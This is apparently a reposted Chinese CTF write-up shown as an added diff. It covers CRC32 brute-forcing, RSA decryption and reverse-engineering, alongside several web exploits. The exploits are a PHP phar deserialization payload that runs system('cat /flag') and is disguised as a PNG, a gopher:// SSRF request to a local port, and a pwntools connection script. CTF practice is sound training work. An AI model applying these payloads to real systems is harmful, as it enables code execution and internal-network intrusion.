+      v16 = 0xffffffff;
+      for ( int cnt = 0; cnt < 0x10; cnt += 4 )
+      {
+       v18 = crc32_table[(unsigned char) (v16 ^ key[cnt])] ^ (v16>> 8);
+       v19 = crc32_table[(unsigned char) (v18 ^ key[cnt + 1])] ^ (v18 >> 8);
+       v20 = crc32_table[(unsigned char) (v19 ^ key[cnt + 2])] ^ (v19 >> 8);
+       v16 = crc32_table[(unsigned char) (v20 ^ key[cnt + 3])] ^ (v20 >> 8);
+      }
+      if ( ~v16 == 0x7F5E79B7 )
+      {
+       printf( "found: %d %d %d %d %dn", i, j, k, l, m );
+      }
+     }
+    }
+   }
+  }
+ }
+}
+
+int main( void )
+{
+ unsigned char x[] = { 237, 247, 252, 137, 206 };
+ start_rand2(x);
+ return(0);
+}
+
+Get Key
+
+根据最后的提示，我们可以得到key。密钥是16字节，这正好对应第二轮的crc32明文byte_A44AD8
+
+key = [0x1B, 0xB1, 0xFF, 0xFD, 0x19, 0xFF, 0x89, 0x8C, 0x09, 0xFF, 0xFF, 0xD7, 0x4A, 0xB3, 0xFF, 0xEB]
+index = [2, 9, 10, 14, 5]
+data = [237, 247, 252, 137, 206]
+
+for i in range(5):
+    key[index[i]] = data[i]
+
+for i in range(16):
+    print(format(key[i], '02x'), end='')
+
+# 1bb1edfd19ce898c09f7fcd74ab389eb
+
+Get Flag
+
+flag:&n&8qoqdeeuysq7U
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//spring</span><br><span class="line">class File &#123;</span><br><span class="line">    public $val1;</span><br><span class="line">    public $val2;</span><br><span class="line">    public $val3;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;val1 = &#x27;file&#x27;;</span><br><span class="line">        $this-&gt;val2 = &#x27;exists&#x27;;</span><br><span class="line">        $this-&gt;val3 = &quot;system(&#x27;cat /flag&#x27;);&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new File();</span><br><span class="line">$phar = new Phar(&#x27;exp.phar&#x27;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;);</span><br><span class="line">$phar-&gt;setMetadata($a);</span><br><span class="line">$phar-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;test&#x27;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">import gzip</span><br><span class="line">import hashlib</span><br><span class="line">with open(&quot;exp.phar&quot;,&#x27;rb&#x27;) as f:</span><br><span class="line">    f = f.read()</span><br><span class="line">s = f[:-28]</span><br><span class="line">s = s.replace(b&#x27;3:&#123;&#x27;, b&#x27;4:&#123;&#x27;)</span><br><span class="line">h = f[-8:]</span><br><span class="line">newf = s + hashlib.sha1(s).digest() + h</span><br><span class="line">print(newf)</span><br><span class="line">newf = gzip.compress(newf)</span><br><span class="line">with open(&#x27;res.png&#x27;,&#x27;wb&#x27;) as f2:</span><br><span class="line">    f2.write(newf)</span><br><span class="line">&lt;linktype=&quot;text/css&quot;href=&quot;gopher://127.0.0.1:</span><br><span class="line">8082/_POST%20%2Fusers%20HTTP%2F1.1%0AHost%3A%20localhost%0AContent-Length%3A%2018%0AContent-type%3A%20application%2Fjson%0A%0A%7B%22user%22%3A%22test456%22%7D&quot;&gt;</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from Crypto.Util.strxor import strxor</span><br><span class="line"></span><br><span class="line">c = 67254133265602132458415338912590207677514059205474875492945840960242620760650527587490927820914970400738307536068560894182603885331513473363314148815933001614692570010664750071300871546575845539616570277302220914885734071483970427419582877989670767595897758329863040523037547687185382294469780732905652150451</span><br><span class="line">d = 4885628697024674802233453512637565599092248491488767824821990279922756927662223348312748794983451796542248787267207054348962258716585568185354414099671493917947012747791554070655258925730967322717771647407982984792632771150018212620323323635510053326184087327891569331050475507897640403090397521797022070233</span><br><span class="line">n = 89714050971394259600440975863751229102748301873549839432714703551498380713981264101533375672970154214062583012365073892089644031804109941766201243163398926438698369735588338279544152140859123834763870759757751944228350552806429642516747541162527058800402619575257179607422628877017180197777983487523142664487</span><br><span class="line"></span><br><span class="line">msg = &quot;This is a secret message&quot;</span><br><span class="line">msg = msg.encode()</span><br><span class="line">msg_length = len(msg)</span><br><span class="line">key = b&#x27;Life is like an ocean only strong-minded can reach the other shore&#x27;</span><br><span class="line">key = key[:</span><br><span class="line">msg_length]</span><br><span class="line"></span><br><span class="line">xor_m = pow(c,d,n)</span><br><span class="line">print(strxor(long_to_bytes(xor_m), key))</span><br><span class="line"></span><br><span class="line"># flag&#123;1s_Pa33w0rd_1y2u22&#125;</span><br><span class="line">from pwn import*</span><br><span class="line">context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;,log_level=&quot;debug&quot;)</span><br><span class="line">context.terminal=[&quot;wt.exe&quot;,&quot;wsl.exe&quot;]</span><br><span class="line">    #libc = ELF(&quot;../libc/&quot;)</span><br><span class="line"># libc = ELF(&quot;./libc-so.6&quot;)</span><br><span class="line">&quot;&quot;&quot;&quot;&quot;</span><br><span class="line">def xxx():</span><br><span class="line">    p.sendlineafter(&quot;&quot;)</span><br><span class="line">    p.sendlineafter(&quot;&quot;)</span><br><span class="line">    p.sendlineafter(&quot;&quot;)</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">def get_p(name):</span><br><span class="line">    global p,elf </span><br><span class="line">    p = process(name)</span><br><span class="line">    #p = remote(&quot;&quot;)</span><br><span class="line">    elf = ELF(name)</span><br><span class="line"># get_p(&quot;./server&quot;)</span><br><span class="line"># sh = remote(&quot;127.0.0.1&quot;,10888)</span><br><span class="line">sh = remote(&quot;fb7e5e8b-3884-e761-f3bf-9d413da0489a11cf.tq.jxsec.cn&quot;,30638)</span><br><span class="line"># gdb.attach(p,&quot;b *0x000400D6B&quot;)</span><br><span class="line"># sleep(2)</span><br><span class="line">    </span><br><span class="line">sh.send(&quot;0:</span><br><span class="line">0x00&quot;)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"># p.interactive()</span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // ecx</span><br><span class="line">  int v4; // eax</span><br><span class="line">  int v5; // ecx</span><br><span class="line">  int v6; // esi</span><br><span class="line">  _BYTE *v7; // edx</span><br><span class="line">  unsigned int v8; // ecx</span><br><span class="line">  unsigned int v9; // ecx</span><br><span class="line">  unsigned int v10; // ecx</span><br><span class="line">  int v11; // eax</span><br><span class="line">  int v12; // ecx</span><br><span class="line">  int v13; // eax</span><br><span class="line">  int v14; // ecx</span><br><span class="line">  int i; // esi</span><br><span class="line">  unsigned int v16; // ecx</span><br><span class="line">  unsigned int j; // edx</span><br><span class="line">  unsigned int v18; // ecx</span><br><span class="line">  unsigned int v19; // ecx</span><br><span class="line">  unsigned int v20; // ecx</span><br><span class="line">  char v21; // al</span><br><span class="line">  unsigned int v23; // [esp+Ch] [ebp-34h] BYREF</span><br><span class="line">  __int128 v24; // [esp+10h] [ebp-30h]</span><br><span class="line">  unsigned int v25; // [esp+20h] [ebp-20h]</span><br><span class="line">  int v26; // [esp+34h] [ebp-Ch] BYREF</span><br><span class="line">  char v27; // [esp+38h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  v26 = 0;</span><br><span class="line">  v27 = 0;</span><br><span class="line">  v4 = sub_2F2550(v3);</span><br><span class="line">  sub_2F2830(v4);</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = 0;                                     // 轮数</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      sub_2F2550(v5);</span><br><span class="line">      v23 = 0;</span><br><span class="line">      sub_2F28D0(&amp;v23);                         // 获取输入</span><br><span class="line">      v7 = (char *)&amp;v26 + v6++;                 // 轮数和前一次的结果合并</span><br><span class="line">      v5 = 8 * (((unsigned __int8)(1 - (_DWORD)&amp;v26) + (_BYTE)v7) &amp; 3);// 第一次是0;第二次是0x10;第三次0x18</span><br><span class="line">      v23 = (unsigned __int8)(v23 &gt;&gt; v5);</span><br><span class="line">      *v7 = byte_320DE0[v23];</span><br><span class="line">    &#125;</span><br><span class="line">    while ( v6 &lt; 5 );</span><br><span class="line">    v8 = dword_320EE0[(unsigned __int8)(~LOBYTE(dword_320EE0[(unsigned __int8)~(_BYTE)v26]) ^ BYTE1(v26))] ^ ((dword_320EE0[(unsigned __int8)~(_BYTE)v26] ^ 0xFFFFFFu) &gt;&gt; 8);</span><br><span class="line">    v9 = dword_320EE0[(unsigned __int8)(v8 ^ BYTE2(v26))] ^ (v8 &gt;&gt; 8);</span><br><span class="line">    v10 = dword_320EE0[(unsigned __int8)(v9 ^ HIBYTE(v26))] ^ (v9 &gt;&gt; 8);</span><br><span class="line">    v5 = ~(dword_320EE0[(unsigned __int8)(v10 ^ v27)] ^ (v10 &gt;&gt; 8));</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v5 != 0x27949C6C );</span><br><span class="line">  v11 = sub_2F2550(0x27949C6C);</span><br><span class="line">  sub_2F2830(v11);</span><br><span class="line">  v25 = 0;</span><br><span class="line">  v24 = 0i64;</span><br><span class="line">  v13 = sub_2F2550(v12);</span><br><span class="line">  sub_2F2830(v13);</span><br><span class="line">  for ( i = 0; i &lt; 5; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_2F2550(v14);</span><br><span class="line">    v23 = 0;</span><br><span class="line">    sub_2F28D0(&amp;v23);</span><br><span class="line">    *((_DWORD *)&amp;v24 + i) = v23;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( (unsigned int)v24 &lt;= 0xF )</span><br><span class="line">    byte_324AD8[v24] = v26;</span><br><span class="line">  if ( DWORD1(v24) &lt;= 0xF )</span><br><span class="line">    byte_324AD8[DWORD1(v24)] = BYTE1(v26);</span><br><span class="line">  if ( DWORD2(v24) &lt;= 0xF )</span><br><span class="line">    byte_324AD8[DWORD2(v24)] = BYTE2(v26);</span><br><span class="line">  if ( HIDWORD(v24) &lt;= 0xF )</span><br><span class="line">    byte_324AD8[HIDWORD(v24)] = HIBYTE(v26);</span><br><span class="line">  if ( v25 &lt;= 0xF )</span><br><span class="line">    byte_324AD8[v25] = v27;</span><br><span class="line">  v16 = -1;</span><br><span class="line">  for ( j = 0; j &lt; 0x10; j += 4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = dword_320EE0[(unsigned __int8)(v16 ^ byte_324AD8[j])] ^ (v16 &gt;&gt; 8);</span><br><span class="line">    v19 = dword_320EE0[(unsigned __int8)(v18 ^ byte_324AD9[j])] ^ (v18 &gt;&gt; 8);</span><br><span class="line">    v20 = dword_320EE0[(unsigned __int8)(v19 ^ byte_324ADA[j])] ^ (v19 &gt;&gt; 8);</span><br><span class="line">    v21 = byte_324ADB[j];</span><br><span class="line">    v16 = dword_320EE0[(unsigned __int8)(v20 ^ v21)] ^ (v20 &gt;&gt; 8);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( ~v16 == 0x7F5E79B7 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_2F1170(&quot;you win: please the key decrypt flag.rn&quot;);</span><br><span class="line">    sub_2F1170(&quot;flag:</span><br><span class="line">uQBF11zD6uYP9kJhRhL8OeesPaaZQQvbl3wx7Ik0T6g=. alg=AESrn&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">do</span><br><span class="line">    &#123;</span><br><span class="line">      sub_2F2550(v5);</span><br><span class="line">      v23 = 0;</span><br><span class="line">      sub_2F28D0(&amp;v23);                         // 获取输入</span><br><span class="line">      v7 = (char *)&amp;v26 + v6++;                 // 轮数和前一次的结果合并</span><br><span class="line">      v5 = 8 * (((unsigned __int8)(1 - (_DWORD)&amp;v26) + (_BYTE)v7) &amp; 3);// 第一次是0;第二次是0x10;第三次0x18</span><br><span class="line">      v23 = (unsigned __int8)(v23 &gt;&gt; v5);</span><br><span class="line">      *v7 = byte_320DE0[v23];</span><br><span class="line">    &#125;</span><br><span class="line">while ( v6 &lt; 5 );</span><br><span class="line">v8 = dword_320EE0[(unsigned __int8)(~LOBYTE(dword_320EE0[(unsigned __int8)~(_BYTE)v26]) ^ BYTE1(v26))] ^ ((dword_320EE0[(unsigned __int8)~(_BYTE)v26] ^ 0xFFFFFFu) &gt;&gt; 8);</span><br><span class="line">    v9 = dword_320EE0[(unsigned __int8)(v8 ^ BYTE2(v26))] ^ (v8 &gt;&gt; 8);</span><br><span class="line">    v10 = dword_320EE0[(unsigned __int8)(v9 ^ HIBYTE(v26))] ^ (v9 &gt;&gt; 8);</span><br><span class="line">    v5 = ~(dword_320EE0[(unsigned __int8)(v10 ^ v27)] ^ (v10 &gt;&gt; 8));</span><br><span class="line">while ( v5 != 0x27949C6C );</span><br><span class="line">int main( void )</span><br><span class="line">&#123;</span><br><span class="line"> unsigned v8, v9, v10, v5;</span><br><span class="line"> for ( int i = 0; i &lt; 256; i++ )</span><br><span class="line"> &#123;</span><br><span class="line">  for ( int j = 0; j &lt; 256; j++ )</span><br><span class="line">  &#123;</span><br><span class="line">   for ( int k = 0; k &lt; 256; k++ )</span><br><span class="line">   &#123;</span><br><span class="line">    for ( int l = 0; l &lt; 256; l++ )</span><br><span class="line">    &#123;</span><br><span class="line">     for ( int m = 0; m &lt; 256; m++ )</span><br><span class="line">     &#123;</span><br><span class="line">      /* i = 0x57, j = 0x65, k = 0xa6, l = 0x3d, m = 0xe5; */</span><br><span class="line">      v8 = crc32_table[(unsigned char)(~((unsigned char)crc32_table[(unsigned char)~i]) ^ j)] ^ ((crc32_table[(unsigned char)~i] ^ 0xFFFFFF) &gt;&gt; 8);</span><br><span class="line">      v9 = crc32_table[(unsigned char)(v8 ^ k)] ^ (v8 &gt;&gt; 8);</span><br><span class="line">      v10 = crc32_table[(unsigned char)(v9 ^ l)] ^ (v9 &gt;&gt; 8);</span><br><span class="line">      v5 = ~(crc32_table[(unsigned char)(v10 ^ m)] ^ (v10 &gt;&gt; 8));</span><br><span class="line">      // printf(&quot;%xn&quot;, v5);</span><br><span class="line">      if ( v5 == 0x27949C6C )</span><br><span class="line">      &#123;</span><br><span class="line">       printf( &quot;%d %d %d %d %dn&quot;, i, j, k, l, m );</span><br><span class="line">       unsigned char x[] = &#123; i, j, k, l, m &#125;;</span><br><span class="line">       // start_rand2( x );</span><br><span class="line">      &#125;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">    return(0);</span><br><span class="line">&#125;</span><br><span class="line">    #include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">const unsigned long crc32_table[258]=&#123;</span><br><span class="line">     0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA, 0x076DC419, 0x706AF48F, 0xE963A535, 0x9E6495A3, 0x0EDB8832, 0x79DCB8A4, 0xE0D5E91E, 0x97D2D988, 0x09B64C2B, 0x7EB17CBD, 0xE7B82D07, 0x90BF1D91, 0x1DB71064, 0x6AB020F2, 0xF3B97148, 0x84BE41DE, 0x1ADAD47D, 0x6DDDE4EB, 0xF4D4B551, 0x83D385C7, 0x136C9856, 0x646BA8C0, 0xFD62F97A, 0x8A65C9EC, 0x14015C4F, 0x63066CD9, 0xFA0F3D63, 0x8D080DF5, 0x3B6E20C8, 0x4C69105E, 0xD56041E4, 0xA2677172, 0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B, 0x35B5A8FA, 0x42B2986C, 0xDBBBC9D6, 0xACBCF940, 0x32D86CE3, 0x45DF5C75, 0xDCD60DCF, 0xABD13D59, 0x26D930AC, 0x51DE003A, 0xC8D75180, 0xBFD06116, 0x21B4F4B5, 0x56B3C423, 0xCFBA9599, 0xB8BDA50F, 0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924, 0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D, 0x76DC4190, 0x01DB7106, 0x98D220BC, 0xEFD5102A, 0x71B18589, 0x06B6B51F, 0x9FBFE4A5, 0xE8B8D433, 0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818, 0x7F6A0DBB, 0x086D3D2D, 0x91646C97, 0xE6635C01, 0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E, 0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457, 0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA, 0xFCB9887C, 0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65, 0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2, 0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB, 0x4369E96A, 0x346ED9FC, 0xAD678846, 0xDA60B8D0, 0x44042D73, 0x33031DE5, 0xAA0A4C5F, 0xDD0D7CC9, 0x5005713C, 0x270241AA, 0xBE0B1010, 0xC90C2086, 0x5768B525, 0x206F85B3, 0xB966D409, 0xCE61E49F, 0x5EDEF90E, 0x29D9C998, 0xB0D09822, 0xC7D7A8B4, 0x59B33D17, 0x2EB40D81, 0xB7BD5C3B, 0xC0BA6CAD,</span><br><span class="line">                0xEDB88320, 0x9ABFB3B6, 0x03B6E20C, 0x74B1D29A, 0xEAD54739, 0x9DD277AF, 0x04DB2615, 0x73DC1683, 0xE3630B12, 0x94643B84, 0x0D6D6A3E, 0x7A6A5AA8, 0xE40ECF0B, 0x9309FF9D, 0x0A00AE27, 0x7D079EB1, 0xF00F9344, 0x8708A3D2, 0x1E01F268, 0x6906C2FE, 0xF762575D, 0x806567CB, 0x196C3671, 0x6E6B06E7, 0xFED41B76, 0x89D32BE0, 0x10DA7A5A, 0x67DD4ACC, 0xF9B9DF6F, 0x8EBEEFF9, 0x17B7BE43, 0x60B08ED5, 0xD6D6A3E8, 0xA1D1937E, 0x38D8C2C4, 0x4FDFF252, 0xD1BB67F1, 0xA6BC5767, 0x3FB506DD, 0x48B2364B, 0xD80D2BDA, 0xAF0A1B4C, 0x36034AF6, 0x41047A60, 0xDF60EFC3, 0xA867DF55, 0x316E8EEF, 0x4669BE79, 0xCB61B38C, 0xBC66831A, 0x256FD2A0, 0x5268E236, 0xCC0C7795, 0xBB0B4703, 0x220216B9, 0x5505262F, 0xC5BA3BBE, 0xB2BD0B28, 0x2BB45A92, 0x5CB36A04, 0xC2D7FFA7, 0xB5D0CF31, 0x2CD99E8B, 0x5BDEAE1D, 0x9B64C2B0, 0xEC63F226, 0x756AA39C, 0x026D930A, 0x9C0906A9, 0xEB0E363F, 0x72076785, 0x05005713, 0x95BF4A82, 0xE2B87A14, 0x7BB12BAE, 0x0CB61B38, 0x92D28E9B, 0xE5D5BE0D, 0x7CDCEFB7, 0x0BDBDF21, 0x86D3D2D4, 0xF1D4E242, 0x68DDB3F8, 0x1FDA836E, 0x81BE16CD, 0xF6B9265B, 0x6FB077E1, 0x18B74777, 0x88085AE6, 0xFF0F6A70, 0x66063BCA, 0x11010B5C, 0x8F659EFF, 0xF862AE69, 0x616BFFD3, 0x166CCF45, 0xA00AE278, 0xD70DD2EE, 0x4E048354, 0x3903B3C2, 0xA7672661, 0xD06016F7, 0x4969474D, 0x3E6E77DB, 0xAED16A4A, 0xD9D65ADC, 0x40DF0B66, 0x37D83BF0, 0xA9BCAE53, 0xDEBB9EC5, 0x47B2CF7F, 0x30B5FFE9, 0xBDBDF21C, 0xCABAC28A, 0x53B39330, 0x24B4A3A6, 0xBAD03605, 0xCDD70693, 0x54DE5729, 0x23D967BF, 0xB3667A2E, 0xC4614AB8, 0x5D681B02, 0x2A6F2B94, 0xB40BBE37, 0xC30C8EA1, 0x5A05DF1B, 0x2D02EF8D, 0x7F5E79B7, 0x00000000</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void start_rand2( unsigned char x[] )</span><br><span class="line">&#123;</span><br><span class="line"> unsigned int v18, v19, v20, v16;</span><br><span class="line"> for ( int i = 0; i &lt; 16; i++ )</span><br><span class="line"> &#123;</span><br><span class="line">  for ( int j = 0; j &lt; 16; j++ )</span><br><span class="line">  &#123;</span><br><span class="line">   for ( int k = 0; k &lt; 16; k++ )</span><br><span class="line">   &#123;</span><br><span class="line">    for ( int l = 0; l &lt; 16; l++ )</span><br><span class="line">    &#123;</span><br><span class="line">     for ( int m = 0; m &lt; 16; m++ )</span><br><span class="line">     &#123;</span><br><span class="line">      unsigned char key[] = &#123; 0x1B, 0xB1, 0xFF, 0xFD, 0x19, 0xFF, 0x89, 0x8C, 0x09, 0xFF, 0xFF, 0xD7, 0x4A, 0xB3, 0xFF, 0xEB &#125;;</span><br><span class="line">      key[i] = x[0];</span><br><span class="line">      key[j] = x[1];</span><br><span class="line">      key[k] = x[2];</span><br><span class="line">      key[l] = x[3];</span><br><span class="line">      key[m] = x[4];</span><br><span class="line">      v16 = 0xffffffff;</span><br><span class="line">      for ( int cnt = 0; cnt &lt; 0x10; cnt += 4 )</span><br><span class="line">      &#123;</span><br><span class="line">       v18 = crc32_table[(unsigned char) (v16 ^ key[cnt])] ^ (v16&gt;&gt; 8);</span><br><span class="line">       v19 = crc32_table[(unsigned char) (v18 ^ key[cnt + 1])] ^ (v18 &gt;&gt; 8);</span><br><span class="line">       v20 = crc32_table[(unsigned char) (v19 ^ key[cnt + 2])] ^ (v19 &gt;&gt; 8);</span><br><span class="line">       v16 = crc32_table[(unsigned char) (v20 ^ key[cnt + 3])] ^ (v20 &gt;&gt; 8);</span><br><span class="line">      &#125;</span><br><span class="line">      if ( ~v16 == 0x7F5E79B7 )</span><br><span class="line">      &#123;</span><br><span class="line">       printf( &quot;found: %d %d %d %d %dn&quot;, i, j, k, l, m );</span><br><span class="line">      &#125;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main( void )</span><br><span class="line">&#123;</span><br><span class="line"> unsigned char x[] = &#123; 237, 247, 252, 137, 206 &#125;;</span><br><span class="line"> start_rand2(x);</span><br><span class="line"> return(0);</span><br><span class="line">&#125;</span><br><span class="line">key = [0x1B, 0xB1, 0xFF, 0xFD, 0x19, 0xFF, 0x89, 0x8C, 0x09, 0xFF, 0xFF, 0xD7, 0x4A, 0xB3, 0xFF, 0xEB]</span><br><span class="line">index = [2, 9, 10, 14, 5]</span><br><span class="line">data = [237, 247, 252, 137, 206]</span><br><span class="line"></span><br><span class="line">for i in range(5):</span><br><span class="line">    key[index[i]] = data[i]</span><br><span class="line"></span><br><span class="line">for i in range(16):</span><br><span class="line">    print(format(key[i], &#x27;02x&#x27;), end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"># 1bb1edfd19ce898c09f7fcd74ab389eb</span><br></pre></td></tr></table></figure>
+
+
+---
+## 附图
+
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+
+---
+
+> **转载声明**：本文转载自 [Des-CTF-Knowledge](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge)（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。
